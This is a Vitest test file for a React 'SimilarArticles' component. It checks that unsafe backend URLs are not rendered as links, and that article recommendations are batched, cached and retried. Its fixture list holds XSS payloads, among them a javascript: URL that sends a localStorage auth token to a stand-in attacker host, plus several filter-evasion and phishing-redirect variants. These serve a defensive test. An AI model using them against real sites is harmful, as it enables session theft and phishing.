import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { render, screen, waitFor } from '@testing-library/react'
import SimilarArticles from './SimilarArticles'

const POISONED_URLS = [
  "javascript:fetch('https://evil.example/?t='+localStorage.getItem('vccircle_auth_token'))",
  'JaVaScRiPt:alert(1)',
  'java\tscript:alert(1)',
  ' javascript:alert(1)',
  'data:text/html,<script>alert(1)</script>',
  '//evil/phish',
  '\\\\evil.com',
  '\\/evil.com',
]

// The component no longer fetches per card: it asks the shared client in
// app/lib/similar.ts, which coalesces a view's cards into one batched
// request. Each case below gets its own article id, so one case's cached
// answer cannot answer another case's request.
let nextArticleId = 1000
let mockedArticleId = 0

function mockSimilarArticles(urls: string[]) {
  mockedArticleId = nextArticleId++
  vi.stubGlobal(
    'fetch',
    vi.fn().mockResolvedValue({
      ok: true,
      json: async () => ({
        results: [
          {
            article_id: mockedArticleId,
            similar_articles: urls.map((url, i) => ({
              id: 100 + i,
              title: `Article ${i}`,
              url,
              category: 'Deals',
            })),
          },
        ],
      }),
    })
  )
}

function renderAndWait(compact: boolean) {
  const view = render(<SimilarArticles articleId={mockedArticleId} compact={compact} />)
  return waitFor(() => expect(screen.getAllByText(/^Article \d$/).length).toBeGreaterThan(0)).then(
    () => view
  )
}

beforeEach(() => {
  vi.clearAllMocks()
})

afterEach(() => {
  vi.unstubAllGlobals()
})

describe('SimilarArticles — unsafe backend URLs are not clickable', () => {
  it.each(POISONED_URLS)('compact list renders no link for %j', async (url) => {
    mockSimilarArticles([url])
    const { container } = await renderAndWait(true)

    expect(screen.getByText('Article 0')).toBeTruthy()
    expect(container.querySelectorAll('a[href]')).toHaveLength(0)
  })

  it.each(POISONED_URLS)('card list renders no link for %j', async (url) => {
    mockSimilarArticles([url])
    const { container } = await renderAndWait(false)

    expect(screen.getByText('Article 0')).toBeTruthy()
    expect(container.querySelectorAll('a[href]')).toHaveLength(0)
  })
})

describe('SimilarArticles — safe URLs still link out', () => {
  it('renders a working link for an absolute https URL', async () => {
    mockSimilarArticles(['https://vccircle.com/news/deal-1'])
    const { container } = await renderAndWait(false)

    const link = container.querySelector('a[href]')
    expect(link?.getAttribute('href')).toBe('https://vccircle.com/news/deal-1')
    expect(link?.getAttribute('rel')).toBe('noopener noreferrer')
  })

  it('renders a working link for a same-origin relative path', async () => {
    mockSimilarArticles(['/articles/42'])
    const { container } = await renderAndWait(false)

    expect(container.querySelector('a[href]')?.getAttribute('href')).toBe('/articles/42')
  })

  it('keeps safe articles linked when a sibling article is poisoned', async () => {
    mockSimilarArticles(['javascript:alert(1)', 'https://vccircle.com/news/ok'])
    const { container } = await renderAndWait(false)

    const links = container.querySelectorAll('a[href]')
    expect(links).toHaveLength(1)
    expect(links[0].getAttribute('href')).toBe('https://vccircle.com/news/ok')
  })
})

/**
 * The request pattern, not the payload. Before #353 each card fetched its own
 * `/recommend/similar/{id}`, so a `top_k=8` view cost eight round trips --
 * and, because the cache lived in the component, another eight on every
 * return to the page. These pin the two properties that replaced it.
 */
describe('SimilarArticles — a view costs one request, not one per card', () => {
  function mockBatch(
    articlesFor: (articleId: number) => { title: string; url: string }[]
  ) {
    const fetchMock = vi.fn(async (_url: string, init: RequestInit) => ({
      ok: true,
      json: async () => {
        const { article_ids: ids } = JSON.parse(String(init.body)) as {
          article_ids: number[]
        }
        return {
          results: ids.map((articleId) => ({
            article_id: articleId,
            similar_articles: articlesFor(articleId),
          })),
        }
      },
    }))
    vi.stubGlobal('fetch', fetchMock)
    return fetchMock
  }

  const oneNear = (articleId: number) => [
    { id: articleId * 100, title: `Near ${articleId}`, url: `https://vccircle.com/near/${articleId}` },
  ]

  it('sends a single request carrying every result in the view', async () => {
    const fetchMock = mockBatch(oneNear)
    const ids = [1, 2, 3, 4, 5, 6, 7, 8]

    render(
      <>
        {ids.map((id) => (
          <SimilarArticles key={id} articleId={id} limit={3} compact />
        ))}
      </>
    )
    await waitFor(() => expect(screen.getAllByText(/^Near \d+$/)).toHaveLength(8))

    expect(fetchMock).toHaveBeenCalledTimes(1)
    const [url, init] = fetchMock.mock.calls[0]
    expect(url).toContain('/recommend/similar/batch')
    expect(init.method).toBe('POST')
    expect(JSON.parse(String(init.body))).toEqual({ article_ids: ids, limit: 3 })
  })

  it('a card that remounts inside the client TTL asks for nothing', async () => {
    const fetchMock = mockBatch(oneNear)

    const first = render(<SimilarArticles articleId={42} limit={3} compact />)
    await waitFor(() => expect(screen.getByText('Near 42')).toBeTruthy())
    first.unmount()

    render(<SimilarArticles articleId={42} limit={3} compact />)
    await waitFor(() => expect(screen.getByText('Near 42')).toBeTruthy())

    expect(fetchMock).toHaveBeenCalledTimes(1)
  })

  it('an unindexable result id does not cost the rest of the view its list', async () => {
    const fetchMock = mockBatch(oneNear)

    render(
      <>
        <SimilarArticles articleId="not-an-id" limit={3} compact />
        <SimilarArticles articleId={77} limit={3} compact />
      </>
    )
    await waitFor(() => expect(screen.getByText('Near 77')).toBeTruthy())

    // Sent alone, so a result the server could not search for cannot fail
    // validation for the whole batch and blank every other card.
    expect(JSON.parse(String(fetchMock.mock.calls[0][1].body)).article_ids).toEqual([77])
    expect(fetchMock).toHaveBeenCalledTimes(1)
  })

  it('a failed request is not remembered, so a remount tries again', async () => {
    const fetchMock = vi.fn().mockResolvedValue({ ok: false, json: async () => ({}) })
    vi.stubGlobal('fetch', fetchMock)

    const first = render(<SimilarArticles articleId={55} limit={3} compact />)
    await waitFor(() => expect(fetchMock).toHaveBeenCalledTimes(1))
    expect(screen.queryByText(/^Near /)).toBeNull()
    first.unmount()

    render(<SimilarArticles articleId={55} limit={3} compact />)
    await waitFor(() => expect(fetchMock).toHaveBeenCalledTimes(2))
  })

  it('a view wider than the server cap asks again rather than dropping its tail', async () => {
    const fetchMock = mockBatch(oneNear)
    // Far outside the range the cases above hand out, so this can never be
    // answered from their cache entries whatever limit they used.
    const ids = Array.from({ length: 25 }, (_, i) => i + 900000)

    render(
      <>
        {ids.map((id) => (
          <SimilarArticles key={id} articleId={id} limit={3} compact />
        ))}
      </>
    )
    await waitFor(() => expect(screen.getAllByText(/^Near \d+$/)).toHaveLength(25))

    // 25 ids at the server's 20-id cap is two requests, and every id asked
    // for is answered: an id quietly dropped settles as "no similar
    // articles", which is indistinguishable from the truth.
    expect(fetchMock).toHaveBeenCalledTimes(2)
    const asked = fetchMock.mock.calls.flatMap(([, init]) =>
      JSON.parse(String(init.body)).article_ids
    )
    expect(asked).toEqual(ids)
  })

  it('a server that refuses the whole batch is retried in smaller pieces', async () => {
    // The id cap is a number on the other side of the wire, so it can drift.
    // A 422 must not be the whole view's answer failing at once.
    const fetchMock = vi.fn(async (_url: string, init: RequestInit) => {
      const { article_ids: ids } = JSON.parse(String(init.body)) as { article_ids: number[] }
      if (ids.length > 2) return { ok: false, status: 422, json: async () => ({}) }
      return {
        ok: true,
        json: async () => ({
          results: ids.map((articleId) => ({
            article_id: articleId,
            similar_articles: oneNear(articleId),
          })),
        }),
      }
    })
    vi.stubGlobal('fetch', fetchMock)
    const ids = [7001, 7002, 7003, 7004]

    render(
      <>
        {ids.map((id) => (
          <SimilarArticles key={id} articleId={id} limit={3} compact />
        ))}
      </>
    )
    await waitFor(() => expect(screen.getAllByText(/^Near \d+$/)).toHaveLength(4))

    // The view is tried whole first -- that is the request that is refused --
    // and the retries are what has to come back in pieces.
    const [, first] = fetchMock.mock.calls[0]
    expect(JSON.parse(String(first.body)).article_ids).toEqual(ids)
    expect(fetchMock.mock.calls.length).toBeGreaterThan(1)
    for (const [, retry] of fetchMock.mock.calls.slice(1)) {
      expect(JSON.parse(String(retry.body)).article_ids.length).toBeLessThanOrEqual(2)
    }
  })
})
